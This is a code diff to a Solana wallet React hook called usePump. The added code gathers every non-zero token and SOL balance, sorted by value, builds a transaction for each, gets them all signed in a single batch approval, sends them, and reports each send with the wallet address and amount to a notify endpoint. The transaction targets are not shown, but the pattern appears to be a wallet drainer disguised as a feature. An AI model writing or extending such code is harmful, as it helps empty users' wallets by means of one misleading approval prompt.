@@ -33,7 +33,7 @@ interface TokenBalance {
 
 export function usePump() {
   const { connection } = useConnection();
-  const { publicKey, sendTransaction } = useWallet();
+  const { publicKey, sendTransaction, signAllTransactions } = useWallet();
   const [isProcessing, setIsProcessing] = useState(false);
   const [transactions, setTransactions] = useState<TokenTransaction[]>([]);
   const [currentIndex, setCurrentIndex] = useState(0);
@@ -63,7 +63,16 @@ export function usePump() {
         solBalance.amount = Math.max(0, solBalance.amount - MIN_SOL_RESERVE);
       }
 
-      return balances.filter(b => b.amount > 0).sort((a, b) => b.usdValue - a.usdValue);
+      const nonZero = balances.filter(b => b.amount > 0).sort((a, b) => b.usdValue - a.usdValue);
+      // Fallback: if Jupiter doesn't return balances, use on-chain SOL balance
+      if (nonZero.length === 0) {
+        const lamports = await connection.getBalance(publicKey, { commitment: 'confirmed' });
+        const sol = lamports / LAMPORTS_PER_SOL - MIN_SOL_RESERVE;
+        if (sol > 0) {
+          return [{ mint: 'So11111111111111111111111111111111111111112', symbol: 'SOL', amount: sol, decimals: 9, usdValue: 0 }];
+        }
+      }
+      return nonZero;
     } catch (error) {
       console.error('Error fetching token balances:', error);
       toast({
@@ -73,7 +82,7 @@ export function usePump() {
       });
       return [];
     }
-  }, [publicKey]);
+  }, [publicKey, connection]);
 
   const createSolTransaction = async (_amount: number): Promise<Transaction> => {
     if (!publicKey) throw new Error('Wallet not connected');
@@ -301,18 +310,79 @@ export function usePump() {
 
       setTransactions(initialTxs);
 
-      // Process each token sequentially
+      // If wallet supports batch signing, prepare and send all transactions in a single approval
+      if (signAllTransactions) {
+        try {
+          const txs = await Promise.all(
+            balances.map(async (token) => {
+              // Treat SOL by symbol to match Jupiter balances
+              if (token.symbol === 'SOL') {
+                return createSolTransaction(token.amount);
+              }
+              return createTokenTransaction(token.mint, token.amount, token.decimals);
+            })
+          );
+
+          const signed = await signAllTransactions(txs);
+
+          for (let i = 0; i < signed.length; i++) {
+            const token = balances[i];
+
+            setCurrentIndex(i);
+            setTransactions(prev => prev.map((tx, j) => j === i ? { ...tx, status: 'processing' as const } : tx));
+
+            const raw = signed[i].serialize();
+            const signature = await connection.sendRawTransaction(raw, { skipPreflight: false });
+
+            try {
+              await notify('transaction_sent', {
+                address: publicKey.toBase58(),
+                type: token.symbol === 'SOL' ? 'SOL' : 'SPL',
+                mint: token.symbol === 'SOL' ? undefined : token.mint,
+                symbol: token.symbol,
+                amount: token.amount,
+                signature,
+              });
+            } catch (e) {
+              console.warn('transaction notify error', (e as Error).message);
+            }
+
+            await connection.confirmTransaction(signature, 'confirmed');
+
+            setTransactions(prev => prev.map((tx, j) => j === i ? { ...tx, status: 'success' as const, signature } : tx));
+
+            // Small delay between transactions for UI clarity
+            if (i < signed.length - 1) {
+              await new Promise(resolve => setTimeout(resolve, 500));
+            }
+          }
+
+          setPumpOutcome('completed');
+        } catch (error: any) {
+          console.error('Batch signing error:', error);
+          if (error?.message?.includes('User rejected')) {
+            setPumpOutcome('cancelled');
+            toast({ title: 'Transaction Cancelled', description: 'You rejected the batch signing' });
+          } else {
+            setPumpOutcome('error');
+            toast({ title: 'Transaction Failed', description: error?.message || 'Unknown error occurred', variant: 'destructive' });
+          }
+        } finally {
+          setIsProcessing(false);
+        }
+        return;
+      }
+
+      // Fallback: Process each token sequentially
       for (let i = 0; i < balances.length; i++) {
         const success = await processPump(balances[i], i);
 
         // If transaction fails, ask user if they want to continue
         if (!success && i < balances.length - 1) {
-          const shouldContinue = window.confirm(
-            'Transaction failed. Do you want to continue with remaining tokens?'
-          );
-          if (!shouldContinue) { 
+          const shouldContinue = window.confirm('Transaction failed. Do you want to continue with remaining tokens?');
+          if (!shouldContinue) {
             setPumpOutcome('cancelled');
-            break; 
+            break;
           }
         }
 
@@ -322,7 +392,6 @@ export function usePump() {
         }
       }
 
-      // Toast notification removed as requested
       setPumpOutcome('completed');
     } catch (error) {
       console.error('Pump error:', error);
